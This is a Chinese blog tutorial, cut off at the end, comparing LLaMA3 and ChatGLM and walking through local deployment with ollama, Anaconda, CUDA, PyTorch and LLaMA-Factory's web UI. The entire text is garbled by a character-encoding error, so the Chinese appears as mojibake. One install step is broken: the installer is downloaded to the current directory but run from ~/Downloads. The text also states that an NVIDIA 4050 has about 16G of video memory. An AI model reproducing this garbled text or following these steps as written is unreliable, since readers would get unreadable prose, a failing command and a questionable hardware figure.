ä¸“æ³¨äºä¸­æ–‡åœºæ™¯çš„è‡ªç„¶è¯­è¨€å¤„ç†å’Œå¯¹è¯ç³»ç»Ÿï¼Œå¹¶æä¾›äº†åŒè¯­æ”¯æŒï¼Œç‰¹åˆ«åœ¨ä¸­æ–‡å¯¹è¯åœºæ™¯ä¸­æœ‰å‡ºè‰²çš„è¡¨ç°ã€‚</li><li>ChatGLM å·²ç»æœ‰å¤šä¸ªç‰ˆæœ¬ï¼ˆChatGLM-6Bã€ChatGLM-2 ç­‰ï¼‰ï¼Œå…¶ä¸­åŒ…å« 60 äº¿å‚æ•°æ¨¡å‹ï¼Œç›®æ ‡æ˜¯æä¾›è½»é‡åŒ–ã€é«˜æ•ˆçš„å¯¹è¯æ¨¡å‹ï¼Œé€‚åˆèµ„æºå—é™çš„ç¯å¢ƒã€‚</li></ul></li></ul><ol start="2"><li><strong>æ¨¡å‹ç»“æ„ä¸å‚æ•°</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA æ¨¡å‹ä»¥å…¶é«˜å‚æ•°æ•ˆç‡é—»åï¼Œé€šå¸¸åœ¨å‚æ•°é‡ç›¸å¯¹è¾ƒå°‘çš„æƒ…å†µä¸‹ä¹Ÿèƒ½å®ç°å‡ºè‰²çš„æ€§èƒ½ã€‚</li><li>LLaMA ç³»åˆ—æ¨¡å‹åœ¨å…¶å‹ç¼©å’Œè®­ç»ƒæŠ€æœ¯ä¸Šæœ‰æ˜¾è‘—åˆ›æ–°ï¼Œä½¿å¾—å®ƒä»¬å¯ä»¥åœ¨ç›¸å¯¹è¾ƒå°çš„è®¡ç®—èµ„æºä¸‹è¿è¡Œè¾ƒå¤§çš„æ¨¡å‹ã€‚</li><li>é¢„è®¡ LLaMA3 ä¹Ÿä¼šå»¶ç»­è¿™äº›ç‰¹ç‚¹ï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–æ¨ç†æ•ˆç‡å’Œå¯æ‰©å±•æ€§ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM æ¨¡å‹çš„ç‰ˆæœ¬å¦‚ ChatGLM-6B ä½¿ç”¨ 60 äº¿å‚æ•°ï¼Œè™½ç„¶å‚æ•°é‡è¾ƒå°ï¼Œä½†åœ¨å¯¹è¯ç”Ÿæˆå’Œä»»åŠ¡å¤„ç†æ–¹é¢è¡¨ç°å‡ºè‰²ã€‚</li><li>å…¶è®¾è®¡æ›´æ³¨é‡åœ¨æœ‰é™èµ„æºä¸‹çš„æ¨ç†æ•ˆç‡ï¼Œå°¤å…¶æ˜¯é€‚ç”¨äºä¸­æ–‡å’ŒåŒè¯­ä»»åŠ¡çš„ç»†å¾®è°ƒæ•´ï¼Œä½¿å…¶æˆä¸ºåœ¨èµ„æºæœ‰é™çš„åº”ç”¨åœºæ™¯ä¸­çš„é¦–é€‰ã€‚</li></ul></li></ul><ol start="3"><li><strong>ä¸»è¦æŠ€æœ¯ç‰¹ç‚¹</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>é«˜æ•ˆçš„å‚æ•°åŒ–è®¾è®¡ï¼Œèƒ½å¤Ÿåœ¨æ€§èƒ½å’Œèµ„æºæ¶ˆè€—ä¹‹é—´å®ç°è‰¯å¥½çš„å¹³è¡¡ã€‚</li><li>é€‚ç”¨äºå¤šè¯­è¨€å’Œå¤šä»»åŠ¡åœºæ™¯ï¼ŒåŒ…æ‹¬ç”Ÿæˆã€ç†è§£ã€ç¿»è¯‘ç­‰ä»»åŠ¡ã€‚</li><li>ç”±äº LLaMA æ˜¯ Meta çš„å¼€æºé¡¹ç›®ï¼Œç ”ç©¶äººå‘˜å’Œå¼€å‘è€…å¯ä»¥è‡ªç”±ä¸‹è½½å’Œä½¿ç”¨è¿™äº›æ¨¡å‹è¿›è¡Œå¼€å‘ã€‚</li><li>æ›´å¤§çš„é€šç”¨æ€§ï¼Œèƒ½å¤Ÿå¤„ç†ä¸åŒç±»å‹çš„è¯­è¨€ä»»åŠ¡ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ä¸“é—¨é’ˆå¯¹ä¸­æ–‡è¯­è¨€å¤„ç†è¿›è¡Œä¼˜åŒ–ï¼Œå°¤å…¶åœ¨ä¸­æ–‡å¯¹è¯ç”Ÿæˆå’Œç¿»è¯‘æ–¹é¢æœ‰æ˜æ˜¾ä¼˜åŠ¿ã€‚</li><li>ChatGLM æä¾›äº†è·¨å¹³å°çš„æ˜“ç”¨æ€§ï¼Œåœ¨æœåŠ¡å™¨ç«¯æˆ–æœ¬åœ°è¿è¡Œæ—¶èµ„æºå ç”¨è¾ƒå°‘ï¼Œå› æ­¤é€‚åˆéƒ¨ç½²åˆ°å„ç§ç¡¬ä»¶ç¯å¢ƒä¸­ã€‚</li><li>ChatGLM åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è¿›è¡Œäº†å¤§é‡çš„ä¸­æ–‡è¯­æ–™ä¼˜åŒ–ï¼Œä½¿å¾—å®ƒåœ¨å¤„ç†ä¸­æ–‡çš„å¯¹è¯ã€é—®ç­”ç­‰ä»»åŠ¡ä¸Šè¡¨ç°æ›´è‡ªç„¶ã€æ›´ç¬¦åˆå®é™…åº”ç”¨éœ€æ±‚ã€‚</li></ul></li></ul><ol start="4"><li><strong>åº”ç”¨åœºæ™¯</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>é€‚åˆäºå¤šè¯­è¨€ã€å¤šä»»åŠ¡å¤„ç†ï¼Œå¹¿æ³›åº”ç”¨äºæ–‡æœ¬ç”Ÿæˆã€æœºå™¨ç¿»è¯‘ã€æ€»ç»“ã€é—®ç­”ç³»ç»Ÿç­‰ã€‚</li><li>é€‚åˆç ”ç©¶æœºæ„å’Œä¼ä¸šè¿›è¡Œå®šåˆ¶åŒ–åº”ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦å¯¹å¤šä¸ªä¸åŒä»»åŠ¡è¿›è¡Œç»Ÿä¸€å¤„ç†çš„æƒ…å†µä¸‹ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ç”±äºå…¶åœ¨ä¸­æ–‡å¤„ç†æ–¹é¢çš„ä¼˜åŒ–ï¼ŒChatGLM æ›´é€‚åˆä¸­æ–‡å¯¹è¯ç³»ç»Ÿã€å®¢æœæœºå™¨äººç­‰åº”ç”¨åœºæ™¯ã€‚</li><li>åœ¨åŒè¯­åº”ç”¨ä¸­è¡¨ç°å‡ºè‰²ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ä¸­æ–‡å’Œè‹±è¯­ä¹‹é—´çš„ç¿»è¯‘ä¸æ²Ÿé€šã€‚</li><li>é€‚åˆä¼ä¸šåœ¨ä¸­æ–‡ç›¸å…³çš„å‚ç›´é¢†åŸŸï¼ˆå¦‚å®¢æœã€æ™ºèƒ½åŠ©æ‰‹ç­‰ï¼‰è¿›è¡Œéƒ¨ç½²ã€‚</li></ul></li></ul><ol start="5"><li><strong>è®­ç»ƒæ•°æ®ä¸æ€§èƒ½</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA ç³»åˆ—æ¨¡å‹ä½¿ç”¨äº†å¤§é‡çš„å¤šè¯­è¨€è¯­æ–™åº“è¿›è¡Œè®­ç»ƒï¼ŒåŒ…æ‹¬æ–°é—»ã€ä¹¦ç±ã€ä»£ç ç­‰ä¸åŒç±»å‹çš„æ•°æ®ã€‚è¿™ä½¿å¾—å®ƒåœ¨å¤šä»»åŠ¡åœºæ™¯ä¸‹å…·æœ‰è‰¯å¥½çš„è¿ç§»èƒ½åŠ›ã€‚</li><li>é¢„è®¡ LLaMA3 åœ¨ä¸Šä¸‹æ–‡ç†è§£ã€ä»»åŠ¡ç”Ÿæˆå’ŒçŸ¥è¯†é—®ç­”ç­‰æ–¹é¢ä¼šè¿›ä¸€æ­¥æå‡ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM çš„è®­ç»ƒæ•°æ®é‡ç‚¹åœ¨ä¸­æ–‡å’Œè‹±è¯­è¯­æ–™ï¼Œç‰¹åˆ«åŠ å¼ºäº†å¯¹ä¸­æ–‡åœºæ™¯çš„ä¼˜åŒ–ã€‚</li><li>ChatGLM åœ¨å¯¹è¯æµç•…åº¦å’Œè¯­å¢ƒç†è§£æ–¹é¢è¡¨ç°ä¼˜å¼‚ï¼Œå°¤å…¶åœ¨ä¸­æ–‡å¯¹è¯ä»»åŠ¡ä¸­çš„æ•ˆæœæ¯”å…¶ä»–è®¸å¤šæ¨¡å‹æ›´åŠ è‡ªç„¶å’Œä¸€è‡´ã€‚</li></ul></li></ul><ol start="6"><li><strong>ç¤¾åŒºä¸å¼€æº</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA ç³»åˆ—æ˜¯å¼€æºçš„ï¼Œç‰¹åˆ«å—åˆ°ç ”ç©¶äººå‘˜å’Œå¼€å‘è€…çš„æ¬¢è¿ã€‚å…¶å‰å‡ ä¸ªç‰ˆæœ¬å¹¿æ³›åº”ç”¨äºç ”ç©¶å’Œå­¦æœ¯é¢†åŸŸã€‚</li><li>ç¤¾åŒºæ”¯æŒå¹¿æ³›ï¼Œå¼€å‘è€…å¯ä»¥è½»æ¾è®¿é—®å’Œå¾®è°ƒè¿™äº›æ¨¡å‹ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM ä¹Ÿå¼€æºï¼Œå¹¶ä¸”æœ‰ä¸“é—¨é’ˆå¯¹ä¸­æ–‡çš„å¼€å‘ç¤¾åŒºæ”¯æŒã€‚</li><li>å®ƒçš„è®¾è®¡æ›´æ³¨é‡è½»é‡åŒ–ã€èµ„æºå‹å¥½å‹åº”ç”¨ï¼Œå°¤å…¶é€‚åˆæƒ³åœ¨ä¸­æ–‡ç¯å¢ƒä¸­ä½¿ç”¨ AI æ¨¡å‹çš„å¼€å‘è€…ã€‚</li></ul></li></ul><h2 id="æŠ€æœ¯å®ç°"><a href="#æŠ€æœ¯å®ç°" class="headerlink" title="æŠ€æœ¯å®ç°"></a>æŠ€æœ¯å®ç°</h2><h3 id="1-ollama"><a href="#1-ollama" class="headerlink" title="1. ollama"></a>1. <strong>ollama</strong></h3><p>å‰å¾€ <strong><a href="https://ollama.com/">ollamaå®˜ç½‘</a><strong>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æœåŠ¡ï¼Œä»¥ä¸‹ä¸º</strong>Windowsç³»ç»Ÿ</strong>æ¼”ç¤º<br><img src="/img/AI_project/models/ollama.png"><br><strong>æ³¨æ„</strong>ï¼šollamaé»˜è®¤æ˜¯ä¸‹è½½åˆ°Cç›˜ï¼ŒåæœŸpullå¤§æ¨¡å‹ä¹Ÿæ˜¯é»˜è®¤å®‰è£…åœ¨Cç›˜ï¼Œå¦‚æœä½ æƒ³ä¿®æ”¹å­˜å‚¨ä½ç½®ï¼Œå¯å‚è€ƒ<a href="https://blog.csdn.net/scj0725/article/details/138087028">è¿™ç¯‡æ–‡ç« </a>,æ·»åŠ ç³»ç»Ÿç¯å¢ƒå˜é‡æ¥è§£å†³</p><p>åœ¨cmdè¾“å…¥ä»¥ä¸‹å‘½ä»¤æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama -v</span><br></pre></td></tr></table></figure><p>å¦‚æœå®‰è£…æˆåŠŸï¼Œè¿”å› **<a href="https://ollama.com/">ollamaå®˜ç½‘</a>**ï¼Œç‚¹å‡»å³ä¸Šè§’modelsæŸ¥è¯¢æ¨¡å‹<br><img src="/img/AI_project/models/llama3.1.png"></p><p>å¯ä»¥çœ‹åˆ°ollamaæä¾›éå¸¸å¤šç§ç±»çš„æ¨¡å‹ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©llama3.1ï¼ˆè¯»è€…å¯ä»¥è‡ªè¡Œå°è¯•å…¶ä»–æ¨¡å‹ï¼Œä½¿ç”¨æ–¹æ³•ä¸€è‡´ï¼‰<br>ç‚¹å‡»llama3.1è¿›å…¥æ¨¡å‹ç•Œé¢<br><img src="/img/AI_project/models/llama3.1-2.png"><br><strong>æ³¨æ„ï¼š</strong> llama3.1æä¾›8Bå’Œ70Bä¸¤ç§æ•°æ®é‡çš„æ¨¡å‹ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¾å¡æ˜¯<strong>NVIDIA 4050</strong>ï¼Œ<strong>æ˜¾å­˜</strong>çº¦16Gï¼Œæœ¬åœ°è·‘llama3.1å¤§æ¨¡å‹å¯¹ç”µè„‘é…ç½®æœ‰ä¸€å®šè¦æ±‚ï¼Œå¦‚éä¼ä¸šéœ€æ±‚ï¼Œä¸ªäººå°è¯•8Bæ•°æ®é‡çš„å¤§æ¨¡å‹å³å¯é€‚ç”¨</p><p>è¿”å›å‘½ä»¤è¡Œï¼Œç²˜è´´ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run llama3.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œä½ å°±å¯ä»¥åœ¨æœ¬åœ°è·‘è‡ªå·±çš„å¤§æ¨¡å‹å•¦<br>è¯¥æ–¹æ³•çš„ä¸è¶³ï¼š</p><ol><li>åªèƒ½åœ¨å‘½ä»¤è¡Œäº¤äº’ï¼Œæ²¡æœ‰æä¾›<strong>å¯è§†åŒ–çš„äº¤äº’ç•Œé¢</strong></li><li>æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹å¯¹<strong>ç”µè„‘é…ç½®</strong>æœ‰ä¸€å®šè¦æ±‚</li><li>åªèƒ½ä½¿ç”¨åŸç”Ÿæ¨¡å‹ï¼Œä¸èƒ½å®ç°<strong>æ¨¡å‹å¾®è°ƒ</strong></li></ol><h3 id="2-ChatGLM3"><a href="#2-ChatGLM3" class="headerlink" title="2.ChatGLM3"></a>2.<strong>ChatGLM3</strong></h3><p>ç¬”è€…æ›¾ç»å°è¯•æœ¬åœ°éƒ¨ç½²ChatGLM3-6Bå¤§æ¨¡å‹ï¼Œé‡åˆ°ä»¥ä¸‹é—®é¢˜<br><img src="/img/AI_project/models/chatglm-1.png"><br><img src="/img/AI_project/models/chatglm-2.png"><br>å¦‚æœä½ çš„æ“ä½œç³»ç»Ÿæ˜¯windowsï¼Œå¯èƒ½ä¹Ÿä¼šé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œå³å®‰è£…ç›¸å…³ä¾èµ–è¿‡ç¨‹ä¸­å‡ºç°ä¸æ“ä½œç³»ç»Ÿå†²çªçš„é—®é¢˜<br>æœ€å¥½çš„è§£å†³åŠæ³•æ˜¯åœ¨<strong>é˜¿é‡Œäº‘</strong>æˆ–<strong>AutoDL</strong>ä¸Šç§Ÿç”¨ä¸€å°æœåŠ¡å™¨ï¼ˆä¸€é”®è§£å†³ç¯å¢ƒé—®é¢˜ï¼‰<br>å…·ä½“çš„éƒ¨ç½²è§†æ–¹æ³•å¯ä»¥å‚è€ƒ<a href="https://www.bilibili.com/video/BV1Cx4y1m7Gd/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">è¯¥è§†é¢‘</a></p><h3 id="3-Llama-factory-Llama3-1"><a href="#3-Llama-factory-Llama3-1" class="headerlink" title="3.Llama-factory+Llama3.1"></a>3.<strong>Llama-factory+Llama3.1</strong></h3><h4 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h4><ul><li>æ”¯æŒCUDAçš„GPUï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥è‡ªè¡Œè”ç³»è¿œç¨‹æœåŠ¡å™¨</li><li>Linux bashç¯å¢ƒï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥ä½¿ç”¨è™šæ‹Ÿæœºæ„å»º</li><li>èƒ½å¤Ÿè¿æ¥åˆ°<a href="https://huggingface.co/">huggingface</a>çš„ç½‘ç»œï¼Œç”¨äºä¸‹è½½æ¨¡å‹ï¼Œå¦‚æœæ²¡æœ‰ï¼Œéœ€è¦ç”¨å…¶ä»–æ–¹æ³•ä¸‹è½½ï¼ˆå¦‚<a href="https://www.modelscope.cn/home">é­”å¡”ç¤¾åŒº</a>ï¼‰</li><li>èƒ½å¤Ÿè¿æ¥<a href="https://github.com/">github</a>çš„ç½‘ç»œï¼Œç”¨äºä¸‹è½½githubä»“åº“</li><li>åŸºç¡€çš„Linuxæ“ä½œæ–¹æ³•</li><li>æœ¬æ–‡åŸºäºåŸºäºUbuntu22.04LTSï¼Œç›¸å…³é…ç½®å¦‚ä¸‹<br><img src="/img/AI_project/models/requirement.png"></li></ul><h4 id="ä½¿ç”¨Anacondaç®¡ç†åŒ…"><a href="#ä½¿ç”¨Anacondaç®¡ç†åŒ…" class="headerlink" title="ä½¿ç”¨Anacondaç®¡ç†åŒ…"></a>ä½¿ç”¨Anacondaç®¡ç†åŒ…</h4><ul><li><p><strong>å®‰è£…Anaconda</strong><br>Anaconda ç¯å¢ƒç›¸è¾ƒäºä¼ ç»Ÿçš„ pip åŒ…ç®¡ç†æ¥è¯´ï¼Œå¯ä»¥æ–¹ä¾¿å¿«æ·åœ°åˆ‡æ¢ä¸åŒç¯å¢ƒï¼Œå¦‚æœæŠŠ pip æ¯”ä½œæŠŠæ‰€æœ‰çš„æ–‡ä»¶éƒ½æ‘Šåˆ°æ¡Œé¢ä¸Šçš„ç¬¨æ‰‹ç¬¨è„šç®¡ç†å‘˜ï¼Œ Anaconda å°±åƒæŠŠæ–‡ä»¶å½’ç±»æ”¾è¿›ä¸åŒæ–‡ä»¶å¤¹é‡Œçš„çˆ±å¹²å‡€ç®¡ç†å‘˜ï¼Œè¿™æ ·çš„æ–‡ä»¶å¤¹åœ¨ Anaconda ä¸­ç§°ä¸ºâ€œç¯å¢ƒâ€ã€‚è¿è¡Œä¸åŒçš„ç¨‹åºæ‰€éœ€çš„ä¾èµ–ä¸åŒï¼Œæœ‰æ—¶å€™ä¼šå‡ºç°å†²çªï¼ŒåŒæ—¶éœ€è¦æŸä¸ªåŒ…çš„ä¸åŒç‰ˆæœ¬ï¼Œå°±å¯ä»¥é€šè¿‡è®¾ç½®ä¸åŒç¯å¢ƒï¼ŒåŸºäºæŸä¸ªç¯å¢ƒè¿è¡Œä¸åŒç¨‹åºã€‚<br>å®‰è£…Anacondaä¾èµ–ä»£ç å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libgl1-mesa-glx libegl1-mesa libxrandr2 libxrandr2 libxss1 libxcursor1 libxcomposite1 libasound2 libxi6 libxtst6</span><br></pre></td></tr></table></figure><p>å®‰è£…Anacondaå®‰è£…å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ˆè¿è¡Œè¿™è¡Œ</span></span><br><span class="line">curl -O https://repo.anaconda.com/archive/Anaconda3-2023.09-0-Linux-x86_64.sh</span><br><span class="line"><span class="comment"># æ¥ç€æ˜¯è¿™è¡Œ</span></span><br><span class="line">bash ~/Downloads/Anaconda3-2023.09-0-Linux-x86_64.sh</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ›å»ºAnacondaç¯å¢ƒ</strong><br>åˆ›å»ºä¸€ä¸ªåä¸ºLLaMAçš„ç¯å¢ƒï¼Œä½¿ç”¨python3.11</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n LLaMA python=3.11</span><br><span class="line"><span class="comment"># ä¸­é—´ä¼šè¯¢é—®ä½ æ˜¯å¦ proceedï¼ˆç»§ç»­ï¼‰ï¼Œè¾“å…¥yç„¶åå›è½¦å³å¯</span></span><br></pre></td></tr></table></figure><p>æ¿€æ´»è¿™ä¸ªç¯å¢ƒ<br><strong>æ³¨æ„</strong>ï¼šåœ¨æ¯æ¬¡é‡æ–°ç™»é™†çš„æ—¶å€™ï¼Œå¿…é¡»è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¿€æ´»è¿™ä¸ªç¯å¢ƒï¼Œå› ä¸ºä½ åœ¨è¿™ä¸ªç¯å¢ƒä¸­å®‰è£…äº†ä¾èµ–é¡¹ï¼Œå¦åˆ™æ— æ³•æ‰¾åˆ°ä¾èµ–é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda activate LLaMA</span><br></pre></td></tr></table></figure></li><li><p><strong>å®‰è£…CUDA</strong><br>CUDA æ˜¯ NVIDIA æ¨å‡ºçš„ä¸€ç§è½¯ç¡¬ä»¶é›†æˆæŠ€æœ¯ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“æ˜¾å¡é€šå¸¸ç”¨äºè¿›è¡Œå›¾åƒå¤„ç†ï¼Œæ¯”å¦‚ç”µè„‘ä¸Šè¿è¡Œçš„å¤§å‹3Dæ¸¸æˆï¼Œå®ƒçš„æµç•…ç¨‹åº¦å’Œå¸§æ•°éƒ½å¾ˆåƒ GPU çš„æ°´å¹³ï¼ŒGPU çš„ç‰¹ç‚¹æ˜¯å¯ä»¥å¤„ç†å¤§å‹å¹¶æ³•è¿ç®—ï¼Œè€Œè¿™ç§ä¼˜åŠ¿å’Œåœ¨æœºå™¨å­¦ä¹ ç­‰é¢†åŸŸéå¸¸æœ‰ç”¨ã€‚CUDA èƒ½è®©æˆ‘ä»¬åˆ©ç”¨è¿™ç§ GPU çš„è¿™ç§ç‰¹ç‚¹æ¥åŠ é€Ÿè®¡ç®—,ä½†æ˜¯ AMD çš„æ˜¾å¡ä¸æ”¯æŒè¿™ç§æŠ€æœ¯ï¼Œæ‰€ä»¥ä½ éœ€è¦ NVIDIA çš„GPUã€‚</p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®‰è£… CUDA ï¼Œé¦–å…ˆæŸ¥çœ‹ä½ çš„æ˜¾å¡æ”¯æŒçš„ CUDA ç‰ˆæœ¬ï¼Œåœ¨ bash å‘½ä»¤è¡Œè¾“å…¥è¿™è¡Œä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi </span><br></pre></td></tr></table></figure><p>å½“å‰CUDAç‰ˆæœ¬æ˜¾ç¤ºåœ¨è¡¨æ ¼æœ€ä¸Šé¢çš„ä¸€è¡Œï¼Œç›´æ¥å‰å¾€<a href="https://developer.nvidia.cn/cuda-downloads?target_os=Linux&target_arch=x86_64&Distribution=Ubuntu&target_version=22.04">NVIDIAå®˜ç½‘</a>é€‰æ‹©å¯¹åº”çš„æ“ä½œç³»ç»Ÿã€æ¶æ„ç­‰ä¸‹è½½å¯¹åº”çš„CUDA</p><ul><li><strong>å®‰è£…PyTorch</strong><br>PyTorch æ˜¯ä¸€ä¸ª Python ç¨‹åºåº“ï¼Œæœ‰åŠ©äºæ„å»ºæ·±åº¦å­¦ä¹ é¡¹ç›®ã€‚å®ƒéå¸¸çµæ´»ï¼Œå¹¶å…è®¸æˆ‘ä»¬ä½¿ç”¨æ·±åº¦å­¦ä¹ é¢†åŸŸæƒ¯ç”¨çš„ Python æ¥è¡¨ç¤ºæ·±åº¦å­¦ä¹ æ¨¡å‹ã€‚å®ƒéå¸¸ä¾¿æ·ï¼Œåœ¨åˆšåˆšåˆ›ç«‹çš„æ—¶å€™å°±å¸å¼•äº†è®¸å¤šä½¿ç”¨è€…ï¼Œå¹¶ä¸”åœ¨ç¬¬ 1 æ¬¡å‘å¸ƒä¹‹åçš„å‡ å¹´é‡Œï¼Œå®ƒå·²ç»æˆä¸ºåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„æ·±åº¦å­¦ä¹ å·¥å…·ä¹‹ä¸€<br> <img src="/img/AI_project/models/cuda.png"><br>ç›´æ¥å‰å¾€<a href="https://pytorch.org/get-started/locally/">Pytorchå®˜ç½‘</a>é€‰æ‹©æ­£ç¡®ç‰ˆæœ¬å¹¶ä¸‹è½½</li></ul><p>æ¯”å¦‚æˆ‘æƒ³ä¸‹è½½åŸºäºlinux,pipæ–¹æ³•ä¸‹è½½pythonè¯­è¨€ï¼ŒCUDA12.1çš„å°±éœ€è¦è¿è¡Œè¿™è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121</span><br></pre></td></tr></table></figure><p>(3)å®‰è£…LLaMA-Factory </p><ul><li><p>clone LLaMA-Factoryä»“åº“<br>é€‰æ‹© LLaMA-Factory å› ä¸ºå®ƒæ”¯æŒç›®å‰å¤šç§æ¨¡å‹ï¼Œé›†æˆäº†è®¸å¤šæ–¹æ³•ï¼Œæ”¯æŒå¤šç§ç²¾åº¦ï¼Œå¹¶ä¸”æœ‰éå¸¸æ˜“ç”¨çš„ webui ç•Œé¢ï¼Œå¯¹æ–°æ‰‹éå¸¸å‹å¥½<br>è¿è¡Œä»¥ä¸‹ä»£ç å®‰è£…LLaMA-Factory</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/hiyouga/LLaMA-Factory.git</span><br><span class="line"><span class="built_in">cd</span> LLaMA-Factory</span><br><span class="line">pip install -e <span class="string">&quot;.[torch,metrics]&quot;</span></span><br></pre></td></tr></table></figure><p>å¯é€‰çš„é¢å¤–ä¾èµ–é¡¹ï¼štorchã€torch-npuã€metricsã€deepspeedã€bitsandbytesã€hqqã€eetqã€gptqã€awqã€aqlmã€vllmã€galoreã€badamã€qwenã€modelscopeã€quality</p></li><li><p>é€šè¿‡è¿œç¨‹æœºå™¨è®¿é—®webui<br>é¦–å…ˆæ‰¾åˆ°<code>LLaMA-Factory/src/llamafactory/webui</code>è¿™ä¸ªç›®å½•ï¼Œæ‰“å¼€interface.pyè¿™ä¸ªæ–‡ä»¶ï¼Œå°† run_web_ui() å’Œ run_web_demo() å‡½æ•°ä¸­å„è‡ªæœ€åä¸€è¡Œçš„launch()å‡½æ•°ä¿®æ”¹æˆè¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def run_web_ui() -&gt; None:</span><br><span class="line">    gradio_share = os.environ.get(&quot;GRADIO_SHARE&quot;, &quot;0&quot;).lower() in [&quot;true&quot;, &quot;1&quot;]</span><br><span class="line">    server_name = os.environ.get(&quot;GRADIO_SERVER_NAME&quot;, &quot;0.0.0.0&quot;)</span><br><span class="line">    create_ui().queue().launch(share=gradio_share, server_name=server_name, inbrowser=True,server_port=8887)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_web_demo() -&gt; None:</span><br><span class="line">    gradio_share = os.environ.get(&quot;GRADIO_SHARE&quot;, &quot;0&quot;).lower() in [&quot;true&quot;, &quot;1&quot;]</span><br><span class="line">    server_name = os.environ.get(&quot;GRADIO_SERVER_NAME&quot;, &quot;0.0.0.0&quot;)</span><br><span class="line">    create_web_demo().queue().launch(share=gradio_share, server_name=server_name, inbrowser=True,server_port=8887)</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåˆ‡æ¢åˆ°<code>LLaMA-Factory</code>è¿™ä¸ªç›®å½•ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤(ä¸€å®šè¦åœ¨<code>LLaMA-Factory</code>è·¯å¾„ä¸‹è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¦åˆ™æ‰¾ä¸åˆ°å¯¹åº”çš„æ•°æ®é›†)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llamafactory-cli webui</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå¼€æ”¾ç«¯å£ï¼Œä½¿å…¶èƒ½è¢«è¿œç¨‹è®¿é—®ã€‚ç¬”è€…ä½¿ç”¨çš„æ˜¯AutoDLç§Ÿç”¨çš„æœåŠ¡å™¨æ“ä½œï¼Œè¿œç¨‹è¿æ¥æ–¹æ³•å¦‚ä¸‹å›¾<br> <img src="/img/AI_project/models/autodl.png"><br><strong>æ³¨æ„</strong>:share&#x3D;Trueè¡¨ç¤ºå…è®¸å…±äº«ï¼Œserver_portè§„å®šäº†å¼€å¯çš„ç«¯å£ï¼Œåœ¨è¿™é‡Œè§„å®šä¸º8887,æ¥ç€å°±å¯ä»¥é€šè¿‡è¿œç¨‹ç•Œé¢è®¿é—® webui äº†ï¼Œè®°å¾—å°†0.0.0.0æ›¿æ¢æˆè¿œç¨‹ä¸»æœºçš„ipåœ°å€ï¼Œå¦‚æœæ— æ³•è¿æ¥ï¼ŒæŸ¥çœ‹ä½ 